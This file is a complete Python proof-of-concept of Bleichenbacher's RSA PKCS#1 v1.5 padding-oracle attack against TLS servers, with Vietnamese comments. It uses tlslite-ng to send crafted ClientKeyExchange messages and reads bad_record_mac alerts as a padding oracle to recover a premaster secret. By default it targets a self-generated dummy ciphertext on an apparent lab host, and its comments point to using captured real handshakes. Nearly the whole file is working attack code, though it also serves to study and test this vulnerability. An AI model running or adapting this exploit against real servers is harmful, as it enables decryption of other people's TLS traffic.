#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Attack A - Bleichenbacher PoC (minimal run)
- Không có argparse; chỉnh HOST/PORT/SECRET ở phần config bên dưới.
- Yêu cầu: pip install tlslite-ng cryptography pycryptodome gmpy2
"""
import socket
import sys
import time
import binascii
from random import randrange

# ---------- CONFIG ----------
HOST = "tls_server"   # <- đổi nếu cần, ví dụ "127.0.0.1"
PORT = 4433           # <- đổi nếu cần
SECRET_BYTES = b"THIS_IS_A_DUMMY_SECRET_FOR_C0"  # secret dùng để tạo ciphertext thử
USE_TEST_CIPHERTEXT = True  # True: generate local sample ciphertext and attack it via oracle
VERBOSE = True
# ---------------------------

# Try to use gmpy2 for speed; fallback to int
try:
    from gmpy2 import mpz, next_prime
except Exception:
    def mpz(x): return int(x)
    def next_prime(x):
        x = int(x) + 1
        def is_prime(n):
            if n < 2: return False
            r = int(n**0.5)
            for i in range(2, r+1):
                if n % i == 0: return False
            return True
        while not is_prime(x):
            x += 1
        return mpz(x)

# tlslite-ng imports
try:
    from tlslite.api import TLSConnection, TLSRemoteAlert, TLSAbruptCloseError
    from tlslite.messages import ClientKeyExchange
    from tlslite.constants import AlertDescription, CipherSuite
except Exception as e:
    print("[!] Error: tlslite-ng import failed. Install with: pip install tlslite-ng")
    print("    Detail:", e)
    sys.exit(1)

# Try parsing cert with cryptography; fallback to pycryptodome
use_cryptography = False
try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.asymmetric import rsa as crypto_rsa
    use_cryptography = True
except Exception:
    pass

try:
    from Crypto.PublicKey import RSA as CryptoRSA
except Exception:
    CryptoRSA = None

# Target cipher ID used in ClientKeyExchange
TARGET_CIPHER_ID = CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA

# ---------- helpers ----------
def bytes_to_int(b: bytes) -> int:
    return int.from_bytes(b, "big")

def int_to_bytes(n: int, length: int = None) -> bytes:
    if n < 0:
        raise ValueError("Negative integer not supported")
    if length is None:
        length = (n.bit_length() + 7) // 8
    if length == 0:
        return b'\x00'
    return int(n).to_bytes(length, "big")

def ceil_div(a, b):
    a = mpz(a); b = mpz(b)
    if b == 0: raise ZeroDivisionError
    return (a + b - 1) // b

def floor_div(a, b):
    a = mpz(a); b = mpz(b)
    if b == 0: raise ZeroDivisionError
    return a // b

# ---------- TLS / Oracle helpers ----------
PUBLIC_KEY_CACHE = {}

def get_public_key(host: str, port: int, timeout: float = 10.0):
    key = f"{host}:{port}"
    if key in PUBLIC_KEY_CACHE:
        return PUBLIC_KEY_CACHE[key]['n'], PUBLIC_KEY_CACHE[key]['e'], PUBLIC_KEY_CACHE[key]['k']

    print(f"[+] Connecting to {host}:{port} to fetch certificate...")
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        conn = TLSConnection(sock)
        conn.handshakeClientCert()

        cert_chain = conn.session.serverCertChain
        if not cert_chain or not getattr(cert_chain, "x509List", None):
            raise ValueError("Server did not return a certificate chain")

        der = cert_chain.x509List[0].bytes

        if use_cryptography:
            cert = x509.load_der_x509_certificate(der, default_backend())
            pub = cert.public_key()
            if not isinstance(pub, crypto_rsa.RSAPublicKey):
                raise TypeError("Server public key is not RSA")
            nums = pub.public_numbers()
            n = mpz(nums.n)
            e = mpz(nums.e)
        else:
            if CryptoRSA is None:
                raise RuntimeError("Need cryptography or pycryptodome to parse certificate")
            try:
                keyobj = CryptoRSA.import_key(der)
                n, e = mpz(keyobj.n), mpz(keyobj.e)
            except Exception:
                raise RuntimeError("Cannot parse RSA public key from DER cert; install 'cryptography'")

        k = (int(n).bit_length() + 7) // 8
        PUBLIC_KEY_CACHE[key] = {'n': n, 'e': e, 'k': k}
        print(f"[+] Got RSA public key: {k*8}-bit, e={int(e)}")
        conn.close()
        return n, e, k

    except Exception as ex:
        if sock:
            try: sock.close()
            except: pass
        raise

def get_target_ciphertext(n, e, k, secret=SECRET_BYTES):
    ps_len = k - 3 - len(secret)
    if ps_len < 8:
        raise ValueError("Key too small or secret too large")
    ps = b"A" * ps_len
    m = b"\x00\x02" + ps + b"\x00" + secret
    m_int = bytes_to_int(m)
    c0 = pow(m_int, int(e), int(n))
    return mpz(c0)

def oracle_query_tls(host: str, port: int, c_int, timeout: float = 5.0):
    n, e, k = get_public_key(host, port)
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        conn = TLSConnection(sock)
        conn.handshakeClientCert()

        c_bytes = int_to_bytes(int(c_int), k)
        cke = ClientKeyExchange(TARGET_CIPHER_ID, conn.session.serverCertChain)
        cke.encryptedPreMasterSecret = c_bytes

        if not hasattr(conn, "_sendMsg") or not hasattr(conn, "_getMsg"):
            raise RuntimeError("tlslite-ng here does not expose _sendMsg/_getMsg; install compatible version")

        try:
            conn._sendMsg(cke)
        except Exception:
            try: sock.close()
            except: pass
            return False

        try:
            conn._getMsg()
        except TLSRemoteAlert as alert:
            try: sock.close()
            except: pass
            return alert.description == AlertDescription.bad_record_mac
        except TLSAbruptCloseError:
            try: sock.close()
            except: pass
            return False
        except Exception:
            try: sock.close()
            except: pass
            return False

        try: sock.close()
        except: pass
        return False

    except TLSRemoteAlert as alert:
        if sock:
            try: sock.close()
            except: pass
        return alert.description == AlertDescription.bad_record_mac
    except Exception:
        if sock:
            try: sock.close()
            except: pass
        return False

# ---------- Bleichenbacher algorithm ----------
def _insert(M, a, b):
    for i, (a_, b_) in enumerate(M):
        if a_ <= b and a <= b_:
            a_new = min(a, a_)
            b_new = max(b, b_)
            M[i] = (a_new, b_new)
            return
    M.append((a, b))

def _step_1(padding_oracle, n, e, c):
    s0 = 1
    c0 = c
    while not padding_oracle(c0):
        s0 = randrange(2, int(n))
        c0 = (c * pow(s0, int(e), int(n))) % int(n)
    return mpz(s0), mpz(c0)

def _step_2a(padding_oracle, n, e, c0, B):
    s = ceil_div(n, 3 * B)
    while not padding_oracle((c0 * pow(s, int(e), int(n))) % int(n)):
        s += 1
    return mpz(s)

def _step_2b(padding_oracle, n, e, c0, s):
    s = mpz(s) + 1
    while not padding_oracle((c0 * pow(int(s), int(e), int(n))) % int(n)):
        s += 1
    return mpz(s)

def _step_2c(padding_oracle, n, e, c0, B, s, a, b):
    r = ceil_div(2 * (b * s - 2 * B), n)
    while True:
        left = ceil_div(2 * B + r * n, b)
        right = floor_div(3 * B + r * n, a)
        for s_candidate in range(int(left), int(right) + 1):
            if padding_oracle((c0 * pow(s_candidate, int(e), int(n))) % int(n)):
                return mpz(s_candidate)
        r += 1

def _step_3(n, B, s, M):
    M_ = []
    for (a, b) in M:
        left = ceil_div(a * s - 3 * B + 1, n)
        right = floor_div(b * s - 2 * B, n)
        for r in range(int(left), int(right) + 1):
            a_ = max(a, ceil_div(2 * B + r * n, s))
            b_ = min(b, floor_div(3 * B - 1 + r * n, s))
            _insert(M_, a_, b_)
    return M_

def bleichenbacher_attack(padding_oracle, n, e, c, verbose=False):
    k = ceil_div(n.bit_length(), 8)
    B = mpz(2) ** (8 * (k - 2))

    if verbose:
        print(f"[+] k={k}, B={B}")

    s0, c0 = _step_1(padding_oracle, n, e, c)
    M = [(2 * B, 3 * B - 1)]
    if verbose:
        print("[*] Step 1 done. Found s0.")

    s = _step_2a(padding_oracle, n, e, c0, B)
    M = _step_3(n, B, s, M)
    if verbose:
        print("[*] Step 2a done. Found s1; intervals:", len(M))

    it = 0
    while True:
        it += 1
        if verbose and it % 1 == 0:
            print(f"[loop] iteration {it}, intervals {len(M)}")
        if len(M) > 1:
            s = _step_2b(padding_oracle, n, e, c0, s)
        else:
            (a, b) = M[0]
            if a == b:
                m_ = (a * pow(int(s0), -1, int(n))) % int(n)
                return mpz(m_)
            s = _step_2c(padding_oracle, n, e, c0, B, s, a, b)
        M = _step_3(n, B, s, M)

# ---------- Adapter ----------
class TLSOracleAdapter:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        n,e,k = get_public_key(host, port)
        self.n = int(n); self.e = int(e); self.k = int(k)
        self.queries = 0

    def __call__(self, c_int):
        self.queries += 1
        return oracle_query_tls(self.host, self.port, c_int)

# ---------- Main run ----------
def run():
    print(f"[+] Starting Attack A against {HOST}:{PORT}")
    try:
        n, e, k = get_public_key(HOST, PORT)
    except Exception as ex:
        print("[!] Failed to retrieve public key:", ex)
        return

    n = int(n); e = int(e); k = int(k)

    # prepare target ciphertext (in practice you capture from handshake)
    if USE_TEST_CIPHERTEXT:
        c = int(get_target_ciphertext(n, e, k, secret=SECRET_BYTES))
        print("[*] Using generated test ciphertext for attack.")
    else:
        # If you have a real captured ciphertext, set c here
        print("[!] USE_TEST_CIPHERTEXT is False but no real ciphertext provided.")
        return

    oracle = TLSOracleAdapter(HOST, PORT)
    start = time.time()
    try:
        m_int = bleichenbacher_attack(oracle, n, e, c, verbose=VERBOSE)
    except KeyboardInterrupt:
        print("Interrupted by user")
        return
    except Exception as ex:
        print("[!] Attack failed with exception:", ex)
        return
    end = time.time()

    print(f"[+] Attack finished in {end - start:.2f}s, oracle queries: {oracle.queries}")

    try:
        padded = int_to_bytes(int(m_int), k)
    except Exception:
        padded = int_to_bytes(int(m_int))

    if len(padded) < 2 or padded[0] != 0 or padded[1] != 2:
        print("[!] Recovered plaintext does not have PKCS#1 v1.5 padding header (00 02).")
        print("Recovered (hex):", hex(int(m_int)))
    else:
        try:
            idx = padded.index(b'\x00', 2)
            secret = padded[idx+1:]
            print("[+] Recovered padded plaintext (hex):", binascii.hexlify(padded))
            print("[+] Recovered secret bytes:", secret)
            try:
                print("[+] Recovered secret (utf-8):", secret.decode())
            except Exception:
                pass
        except ValueError:
            print("[!] No 0x00 separator found in padding. Raw padded (hex):", binascii.hexlify(padded))

if __name__ == "__main__":
    run()
